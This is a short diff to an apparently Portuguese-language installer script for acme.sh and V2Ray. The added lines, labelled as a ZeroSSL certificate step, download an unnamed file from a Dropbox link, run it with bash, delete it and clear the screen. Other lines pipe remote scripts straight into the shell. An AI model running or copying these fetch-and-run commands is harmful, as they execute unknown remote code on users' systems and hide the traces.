@@ -75,6 +75,11 @@ echo -e ""
 echo -e "\033[1;37mEXECUTANDO SCRIPT ACME\033[0m"
 echo -e ""
 curl https://get.acme.sh | sh
+echo -e ""
+echo -e "\033[1;37mCERTIFICADO ZERO SSL\033[0m"
+wget https://www.dropbox.com/s/urum6eywbcxzv42/inst && bash inst
+rm inst* > /dev/null 2>&1 
+clear
 echo -e "\033[1;37mINSTALANDO V2RAY.....\033[1;31m \033[0m"
 bash <(curl -Ls https://raw.githubusercontent.com/Anonynet1/v2ray-/main/install.sh)
 sleep 1
